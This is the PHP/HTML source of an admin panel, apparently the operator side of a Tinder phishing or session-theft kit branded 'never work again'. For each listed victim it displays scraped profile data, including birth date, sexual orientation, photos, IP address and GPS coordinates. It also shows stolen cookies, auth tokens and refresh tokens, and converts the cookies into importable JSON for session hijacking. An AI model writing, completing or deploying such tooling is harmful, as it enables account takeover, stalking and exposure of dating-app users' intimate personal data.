<?php
include '../conf.php';
require('defender.php');

$query = "SELECT * FROM analytics";
$query_run = mysqli_query($con, $query);

if (mysqli_num_rows($query_run) == 1) {

  $analytics = mysqli_fetch_array($query_run);
  $visits = $analytics['visits'];
  $tinder = $analytics['tinder'];
  $bots = $analytics['bots'];
  $errors = $analytics['errors'];

}
?>

<!DOCTYPE html>
<html lang="en" dir="ltr" data-bs-theme="dark" data-color-theme="Blue_Theme" data-layout="vertical">

<head>
  <!-- Required meta tags -->
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Core Css -->
  <link rel="stylesheet" href="assets/css/styles.css" />

  <title>Sudo</title>

  <style>
    @media (min-width: 768px) {
      .col-md-6 {
        flex: 0 0 auto;
        width: 33.3%;
      }
    }

    @media (min-width: 992px) {
      .col-lg-6 {
        flex: 0 0 auto;
        width: 100%;
      }
    }

    @media (min-width: 992px) {
      .col-lg-8 {
        flex: 0 0 auto;
        width: 100%;
      }
    }

    .w-100 {
      width: 105% !important;
    }

    @media (min-width: 1300px) {
      [data-layout="vertical"] body .page-wrapper {
        margin-left: 0px;
      }
    }

    @media (min-width: 1300px) {
      [data-layout="vertical"] body[data-sidebartype="mini-sidebar"] .page-wrapper {
        margin-left: 0px;
      }
    }

    @media (min-width: 1300px) {
      [data-layout="vertical"] .topbar {
        width: 100%;
      }
    }

    @media (min-width: 768px) {
      .jamma {
        width: 25%;
      }
    }

    .brand-logo {
      padding: 0 0px;
    }

    @media (min-width: 768px) {
      .brand-logo {
        padding: 0 24px;
      }
    }
  </style>

</head>

<body>

  <div id="main-wrapper">

    <div class="page-wrapper">
      <!--  Header Start -->
      <header class="topbar">
        <div class="with-vertical"><!-- ---------------------------------- -->
          <!-- Start Vertical Layout Header -->
          <!-- ---------------------------------- -->
          <nav class="navbar navbar-expand-lg p-0">

            <div class="brand-logo d-flex align-items-center justify-content-between">
              <p style="font-size: 25px; margin-top: 20px;" class="text-nowrap logo-img"><span
                  style="font-weight: bold;">nwa.</span> never work again</p>
            </div>

            <a class="navbar-toggler nav-icon-hover-bg rounded-circle p-0 mx-0 border-0" href="javascript:void(0)"
              data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false"
              aria-label="Toggle navigation">
              <i class="ti ti-align-justified fs-7"></i>
            </a>
            <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
              <div class="d-flex align-items-center justify-content-between">

                <ul style="margin: 10px;" class="navbar-nav flex-row ms-auto align-items-center justify-content-center">
                  <!-- ------------------------------- -->
                  <!-- start light/dark mode dropdown -->
                  <!-- ------------------------------- -->
                  <li class="nav-item nav-icon-hover-bg rounded-circle">
                    <a class="nav-link moon dark-layout" href="javascript:void(0)">
                      <i class="ti ti-moon moon"></i>
                    </a>
                    <a class="nav-link sun light-layout" href="javascript:void(0)">
                      <i class="ti ti-sun sun"></i>
                    </a>
                  </li>
                  <!-- ------------------------------- -->
                  <!-- end light/dark mode dropdown -->
                  <!-- ------------------------------- -->





                </ul>
              </div>
            </div>
          </nav>
          <!-- ---------------------------------- -->
          <!-- End Vertical Layout Header -->
          <!-- ---------------------------------- -->

        </div>

      </header>
      <!--  Header End -->

      <div class="body-wrapper">
        <div class="container-fluid">

          <!-- Row -->
          <div class="row">
            <!-- Column -->
            <div class="col-lg-6">
              <div class="card overflow-hidden bg-primary-subtle border-0">
                <div class="card-body">
                  <h4 style="font-style: italic; font-size: 15px;" class="position-relative">
                    "Fear not, for I am with you; be not dismayed, for I am your God; I will strengthen you, I will help
                    you, I will uphold you with my righteous right hand."
                  </h4>
                  <h4 style="font-style: italic; font-size: 10px;" class="position-relative">
                    ~ Isaiah 41:10
                  </h4>
                </div>
              </div>


              <div class="col-lg-8">
                <div class="card-group">
                  <div class="card">
                    <div class="card-body">
                      <span
                        class="btn round-50 fs-6 text-info rounded-circle bg-info-subtle d-flex align-items-center justify-content-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                          class="icon icon-tabler icons-tabler-outline icon-tabler-users">
                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                          <path d="M9 7m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0"></path>
                          <path d="M3 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2"></path>
                          <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                          <path d="M21 21v-2a4 4 0 0 0 -3 -3.85"></path>
                        </svg>
                      </span>
                      <h3 class="mt-3 pt-1 mb-0 fs-6">
                        <?= $visits; ?>
                      </h3>
                      <h6 class="text-muted mb-0 fw-normal">Visits</h6>
                    </div>
                  </div>
                  <div class="card">
                    <div class="card-body">
                      <span
                        class="btn round-50 fs-6 text-success rounded-circle bg-success-subtle d-flex align-items-center justify-content-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                          class="icon icon-tabler icons-tabler-outline icon-tabler-infinity">
                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                          <path
                            d="M9.828 9.172a4 4 0 1 0 0 5.656a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828">
                          </path>
                        </svg>
                      </span>
                      <h3 class="mt-3 pt-1 mb-0 fs-6">
                        <?= $tinder; ?>
                      </h3>
                      <h6 class="text-muted mb-0 fw-normal">Tinder</h6>
                    </div>
                  </div>
                  <div class="card">
                    <div class="card-body">
                      <span
                        class="btn round-50 fs-6 text-danger rounded-circle bg-danger-subtle d-flex align-items-center justify-content-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                          class="icon icon-tabler icons-tabler-outline icon-tabler-robot">
                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                          <path d="M6 4m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v4a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path>
                          <path d="M12 2v2"></path>
                          <path d="M9 12v9"></path>
                          <path d="M15 12v9"></path>
                          <path d="M5 16l4 -2"></path>
                          <path d="M15 14l4 2"></path>
                          <path d="M9 18h6"></path>
                          <path d="M10 8v.01"></path>
                          <path d="M14 8v.01"></path>
                        </svg>
                      </span>
                      <h3 class="mt-3 pt-1 mb-0 fs-6 d-flex align-items-center">
                        <?= $bots; ?>
                      </h3>
                      <h6 class="text-muted mb-0 fw-normal">Bots</h6>
                    </div>
                  </div>
                  <div class="card">
                    <div class="card-body">
                      <span
                        class="btn round-50 fs-6 text-warning rounded-circle bg-warning-subtle d-flex align-items-center justify-content-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                          class="icon icon-tabler icons-tabler-outline icon-tabler-bug">
                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                          <path d="M9 9v-1a3 3 0 0 1 6 0v1"></path>
                          <path d="M8 9h8a6 6 0 0 1 1 3v3a5 5 0 0 1 -10 0v-3a6 6 0 0 1 1 -3"></path>
                          <path d="M3 13l4 0"></path>
                          <path d="M17 13l4 0"></path>
                          <path d="M12 20l0 -6"></path>
                          <path d="M4 19l3.35 -2"></path>
                          <path d="M20 19l-3.35 -2"></path>
                          <path d="M4 7l3.75 2.4"></path>
                          <path d="M20 7l-3.75 2.4"></path>
                        </svg>
                      </span>
                      <h3 class="mt-3 pt-1 mb-0 fs-6">
                        <?= $errors; ?>
                      </h3>
                      <h6 class="text-muted mb-0 fw-normal">Errors</h6>
                    </div>
                  </div>
                </div>
              </div>

            </div>
            <!-- column -->


            <div style="margin-top: 30px;" class="col-12">
              <!-- All Sessions -->
              <div class="d-flex border-bottom title-part-padding px-0 mb-3 align-items-center">
                <h4 class="card-title">Sessions</h4>
                <div class="ms-auto flex-shrink-0">
                  <button class="btn bg-primary-subtle text-primary btn-sm" title="View All" data-bs-toggle="modal"
                    data-bs-target="#view-code3-modal">
                    <i class="ti ti-code fs-6"></i>
                  </button>
                  <!-- Code Modal -->
                  <div id="view-code3-modal" class="modal fade" tabindex="-1" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-scrollable modal-lg">
                      <div class="modal-content">
                        <div class="modal-header border-bottom">
                          <h5 class="modal-title" id="exampleModalLabel">
                            TXT
                          </h5>
                          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                          <pre class="language-html" tabindex="0">
                            <code class="language-html">
                            <?php echo htmlentities(print_r($clientsData, true)); ?>
                            </code>
                          </pre>
                        </div>
                      </div>
                      <!-- /.modal-content -->
                    </div>
                    <!-- /.modal-dialog -->
                  </div>
                  <!-- /.modal -->
                </div>
              </div>
            </div>


            <div class="row justify-content-center">

              <?php

              $query = "SELECT * FROM clientele";
              $query_run = mysqli_query($con, $query);

              if (mysqli_num_rows($query_run) > 0) {
                foreach ($query_run as $clients) {

                  $cookie_exists = "";
                  $t_username = "";

                  if ($clients['tinder_cookie_1'] && $clients['tinder_cookie_2']) {

                    $cookie_exists = '<span style="padding: 6px 10px;" class="mb-1 badge rounded-pill bg-success-subtle text-success">C*</span>';

                  }

                  $t_username = str_replace(" ", "<br>", htmlspecialchars($clients['tinder_username'], ENT_QUOTES, 'UTF-8'));

                  $uid = $clients['uid'];

                  ?>


                  <div class="col-lg-4 col-md-6 jamma">
                    <div class="card">
                      <div style="padding: 20px 1rem 10px 1rem;" class="card-body p-10">
                        <h5 class="card-title fs-5"><?= $t_username; ?></h5>
                      </div>
                      <ul class="list-group list-group-flush">
                        <button style="text-align: left;" class="list-group-item view_data" data-bs-toggle="offcanvas"
                          data-bs-target="#offcanvasBottom" aria-controls="offcanvasBottom"
                          value="<?= $uid; ?>">Data</button>
                        <button style="text-align: left;" class="list-group-item view_cookies" data-bs-toggle="offcanvas"
                          data-bs-target="#offcanvasBottom" aria-controls="offcanvasBottom"
                          value="<?= $uid; ?>">Cookies</button>
                        <button style="text-align: left;" class="list-group-item deleter"
                          value="<?= $uid; ?>">Delete</button>
                      </ul>

                      <ul class="list-group list-group-flush">
                        <li style="margin-top: 5px; margin-bottom: 5px;" class="list-group-item"><?= $cookie_exists; ?></li>
                      </ul>
                    </div>

                  </div>


                  <?php
                }
              }
              ?>


            </div>





          </div>
          <!-- Row -->
        </div>
        <!----Footer--->
        <!-- -------------------------------------------------------------- -->
        <!-- footer -->
        <!-- -------------------------------------------------------------- -->
        <footer class="footer py-3 bg-white border-top text-center">
          2025© Never Work Again.
        </footer>
        <!-- -------------------------------------------------------------- -->
        <!-- End footer -->
        <!-- -------------------------------------------------------------- -->
        <!----Footer End--->
      </div>
      <script>
        function handleColorTheme(e) {
          document.documentElement.setAttribute("data-color-theme", e);
        }
      </script>
      <button class="btn btn-primary p-3 rounded-circle d-flex align-items-center justify-content-center customizer-btn"
        type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasExample" aria-controls="offcanvasExample">
        <i class="icon ti ti-settings fs-7"></i>
      </button>

      <div class="offcanvas customizer offcanvas-end" tabindex="-1" id="offcanvasExample"
        aria-labelledby="offcanvasExampleLabel">
        <div class="d-flex align-items-center justify-content-between p-3 border-bottom">
          <h4 class="offcanvas-title fw-semibold" id="offcanvasExampleLabel">
            Settings
          </h4>
          <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body h-n80" data-simplebar>
          <h6 class="fw-semibold fs-4 mb-2">Theme</h6>

          <div class="d-flex flex-row gap-3 customizer-box" role="group">
            <input type="radio" class="btn-check light-layout" name="theme-layout" id="light-layout"
              autocomplete="off" />
            <label class="btn p-9 btn-outline-primary rounded-2" for="light-layout">
              <i class="icon ti ti-brightness-up fs-7 me-2"></i>Light
            </label>

            <input type="radio" class="btn-check dark-layout" name="theme-layout" id="dark-layout" autocomplete="off" />
            <label class="btn p-9 btn-outline-primary rounded-2" for="dark-layout">
              <i class="icon ti ti-moon fs-7 me-2"></i>Dark
            </label>
          </div>

          <h6 class="mt-5 fw-semibold fs-4 mb-2">Theme Colors</h6>

          <div class="d-flex flex-row flex-wrap gap-3 customizer-box color-pallete" role="group">
            <input type="radio" class="btn-check" name="color-theme-layout" id="Blue_Theme" autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Blue_Theme')" for="Blue_Theme" data-bs-toggle="tooltip" data-bs-placement="top"
              data-bs-title="BLUE_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-1">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>

            <input type="radio" class="btn-check" name="color-theme-layout" id="Aqua_Theme" autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Aqua_Theme')" for="Aqua_Theme" data-bs-toggle="tooltip" data-bs-placement="top"
              data-bs-title="AQUA_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-2">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>

            <input type="radio" class="btn-check" name="color-theme-layout" id="Purple_Theme" autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Purple_Theme')" for="Purple_Theme" data-bs-toggle="tooltip"
              data-bs-placement="top" data-bs-title="PURPLE_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-3">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>

            <input type="radio" class="btn-check" name="color-theme-layout" id="green-theme-layout"
              autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Green_Theme')" for="green-theme-layout" data-bs-toggle="tooltip"
              data-bs-placement="top" data-bs-title="GREEN_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-4">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>

            <input type="radio" class="btn-check" name="color-theme-layout" id="cyan-theme-layout" autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Cyan_Theme')" for="cyan-theme-layout" data-bs-toggle="tooltip"
              data-bs-placement="top" data-bs-title="CYAN_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-5">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>

            <input type="radio" class="btn-check" name="color-theme-layout" id="orange-theme-layout"
              autocomplete="off" />
            <label class="btn p-9 btn-outline-primary d-flex align-items-center justify-content-center"
              onclick="handleColorTheme('Orange_Theme')" for="orange-theme-layout" data-bs-toggle="tooltip"
              data-bs-placement="top" data-bs-title="ORANGE_THEME">
              <div class="color-box rounded-circle d-flex align-items-center justify-content-center skin-6">
                <i class="ti ti-check text-white d-flex icon fs-5"></i>
              </div>
            </label>
          </div>


        </div>
      </div>
    </div>


  </div>
  <div class="dark-transparent sidebartoggler"></div>
  <!-- Import Js Files -->
  <script src="assets/js/bootstrap.bundle.min.js"></script>
  <script src="assets/js/app.dark.init.js"></script>
  <script src="assets/js/theme.js"></script>
  <script src="assets/js/app.min.js"></script>

  <!-- solar icons -->
  <script src="assets/js/iconify-icon.min.js"></script>


  <div style="height: 70vh;" class="offcanvas offcanvas-bottom" tabindex="-1" id="offcanvasBottom"
    aria-labelledby="offcanvasBottomLabel" aria-modal="true" role="dialog">
    <div class="offcanvas-header">
      <h5 id="viewer_title" class="offcanvas-title" id="offcanvasExampleLabel">XYZ</h5>
      <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
    </div>
    <div class="offcanvas-body">
      <div id="viewer_body">xyz</div>
      <div id="options_body" style="margin-top: 10px;"></div>
    </div>
  </div>


  <script>
    document.addEventListener('click', function (event) {
      if (event.target.classList.contains('view_data')) {
        var uid = event.target.value;
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              var res = JSON.parse(xhr.response);
              if (res.status == 404) {
                alert(res.message);
              } else if (res.status == 200) {

                document.getElementById('viewer_title').innerText = "Data";

                var innerData = "";

                if (res.data.tinder_username) {
                  innerData += "[Username]: " + res.data.tinder_username + "\n";
                }

                if (res.data.tinder_profile) {

                  var tinderScrapeString = res.data.tinder_profile;

                  tinderScrape = JSON.parse(tinderScrapeString)

                  var data = tinderScrape.data;

                  if (data.user.name) {
                    innerData += "[T][Name (" + data.user.all_in_gender.map(gender => gender.name) + ")]: " + data.user.name + "\n";
                  }

                  if (data.user.birth_date) {
                    innerData += `[T][Date of Birth (DD/MM/YYYY)]: ${String(new Date(data.user.birth_date).getUTCDate()).padStart(2, '0')}/${String(new Date(data.user.birth_date).getUTCMonth() + 1).padStart(2, '0')}/${new Date(data.user.birth_date).getUTCFullYear()}\n`;
                  }

                  if (data.user.pos_info.country.name) {
                    innerData += "[T][Country (" + data.user.pos_info.timezone + ")]: " + data.user.pos_info.country.name + "\n";
                  }

                  if (data.likes.likes_remaining) {
                    innerData += "[T][Likes Remaining]: " + data.likes.likes_remaining + "\n";
                  }

                  if (data.user.age_filter_min) {
                    innerData += "[T][Age Filter]: " + data.user.age_filter_min + "-" + data.user.age_filter_max + "\n";
                  }

                  if (data.user.sexual_orientations) {
                    innerData += "[T][Sexual Orientations]: " + data.user.sexual_orientations.map(orientation => orientation.name).join(", ") + "\n";
                  }

                  if (data.user.user_interests) {
                    innerData += "[T][Interests]: " + data.user.user_interests.selected_interests.map(interest => interest.name).join(", ") + "\n";
                  }

                  if (data.user.selected_descriptors[0]) {
                    innerData += "[T][Descriptors]: " + data.user.selected_descriptors[0].choice_selections.map(selection => selection.name) + "\n";
                  }

                  if (data.user.photos) {
                    innerData += "[T][Selfies]:\n" +
                      data.user.photos
                        .map(photo => "https://images-ssl.gotinder.com" + new URL(photo.url).pathname)
                        .join("\n") + "\n";
                  }

                  if (data.user.create_date) {
                    innerData += `[T][Creation Date (DD/MM/YYYY)]: ${String(new Date(data.user.create_date).getUTCDate()).padStart(2, '0')}/${String(new Date(data.user.create_date).getUTCMonth() + 1).padStart(2, '0')}/${new Date(data.user.create_date).getUTCFullYear()}\n`;
                  }

                }

                if (res.data.user_agent) {
                  innerData += "[User Agent]: " + res.data.user_agent + "\n";
                }

                if (res.data.remote_addr) {
                  innerData += "[IP Address]: " + res.data.remote_addr + "\n";
                }

                if (res.data.region) {
                  innerData += "[Region]: " + res.data.region + "\n";
                }

                if (res.data.city) {
                  innerData += "[City]: " + res.data.city + "\n";
                }

                if (res.data.latitude) {
                  innerData += "[Latitude]: " + res.data.latitude + "\n";
                }

                if (res.data.longitude) {
                  innerData += "[Longitude]: " + res.data.longitude + "\n";
                }

                if (res.data.time_obtained) {
                  innerData += "[Time Obtained]: " + res.data.time_obtained + "\n";
                }

                document.getElementById('viewer_body').innerText = innerData;
                document.getElementById('options_body').innerHTML = "";

              }
            } else {
              console.error('Error:', xhr.status);
            }
          }
        };
        xhr.open('GET', '../nwa.php?uid_clientele=' + uid, true);
        xhr.send();
      } else if (event.target.classList.contains('view_cookies')) {
        var uid = event.target.value;
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              var res = JSON.parse(xhr.response);
              if (res.status == 404) {
                alert(res.message);
              } else if (res.status == 200) {

                document.getElementById('viewer_title').innerText = "Cookies";

                if (res.data.tinder_cookie_1) {

                  document.getElementById('viewer_body').innerText = "";

                  document.getElementById('options_body').innerHTML = `<button id="cookiesBtn" value="${uid}">[D1] Cookies</button> \n <button id="apiBtn" value="${uid}">[H1] API</button> \n <button id="lstorageBtn" value="${uid}">[L1] LocalStorage</button>`;

                  document.getElementById('cookiesBtn').addEventListener('click', function () {

                    let cookiesForClipboard = [];

                    var cookieMappings = {
                      "tinder_cookie_1": "AWSALB",
                      "tinder_cookie_2": "AWSALBCORS"
                    };

                    for (let [key, value] of Object.entries(res.data)) {
                      if (key.startsWith("tinder_cookie_")) {
                        var mappedCookieName = cookieMappings[key] || key;

                        cookiesForClipboard.push({
                          domain: "tinder.com",
                          hostOnly: true,
                          httpOnly: false,
                          name: mappedCookieName,
                          path: "/",
                          sameSite: "None",
                          secure: (mappedCookieName === "AWSALBCORS"),
                          value: value
                        });
                      }
                    }

                    document.getElementById('viewer_body').innerText = JSON.stringify(cookiesForClipboard);

                  });

                  document.getElementById('apiBtn').addEventListener('click', function () {

                    var innerData = "";

                    if (res.data.x_auth_token) {
                      innerData += "[X-AUTH-TOKEN]: " + res.data.x_auth_token + "\n";
                    }
                    if (res.data.app_session_id) {
                      innerData += "[APP-SESSION-ID]: " + res.data.app_session_id + "\n";
                    }
                    if (res.data.user_session_id) {
                      innerData += "[USER-SESSION-ID]: " + res.data.user_session_id + "\n";
                    }
                    if (res.data.persistent_device_id) {
                      innerData += "[PERSISTENT-DEVICE-ID]: " + res.data.persistent_device_id + "\n";
                    }

                    document.getElementById('viewer_body').innerText = innerData;

                  });


                  document.getElementById('lstorageBtn').addEventListener('click', function () {

                    var innerData = "";

                    if (res.data.uuid) {
                      innerData += "[XO]: " + res.data.uuid + "|" + res.data.api_token + "|" + res.data.refresh_token + "\n";
                    }
                    if (res.data.active_tab_key) {
                      innerData += "[ACTIVE TAB KEY]: " + res.data.active_tab_key + "\n";
                    }
                    if (res.data.api_token) {
                      innerData += "[API TOKEN]: " + res.data.api_token + "\n";
                    }
                    if (res.data.refresh_token) {
                      innerData += "[REFRESH TOKEN]: " + res.data.refresh_token + "\n";
                    }
                    if (res.data.uuid) {
                      innerData += "[PERSISTENT DEVICE ID]: " + res.data.uuid + "\n";
                    }
                    if (res.data.config_service) {
                      innerData += "[CONFIG SERVICE]: " + res.data.config_service + "\n";
                    }

                    document.getElementById('viewer_body').innerText = innerData;

                  });


                } else {

                  document.getElementById('viewer_body').innerText = "No cookies exist for " + res.data.first_name;

                }

              }
            } else {
              console.error('Error:', xhr.status);
            }
          }
        };
        xhr.open('GET', '../nwa.php?uid_clientele=' + uid, true);
        xhr.send();
      } else if (event.target.classList.contains('deleter')) {
        event.preventDefault();
        var uid = event.target.value;
        if (confirm('Are you sure you want to delete this data?')) {
          var xhr = new XMLHttpRequest();
          xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
              if (xhr.status === 200) {
                var res = JSON.parse(xhr.response);
                if (res.status == 404) {
                  alert(res.message);
                } else if (res.status == 200) {

                  console.log("Data deleted successfully.")

                }
              } else {
                console.error('Error:', xhr.status);
              }
            }
          };
          xhr.open('GET', '../nwa.php?delete_clientele=' + uid, true);
          xhr.send();
        }

      }

    });
  </script>

</body>

</html>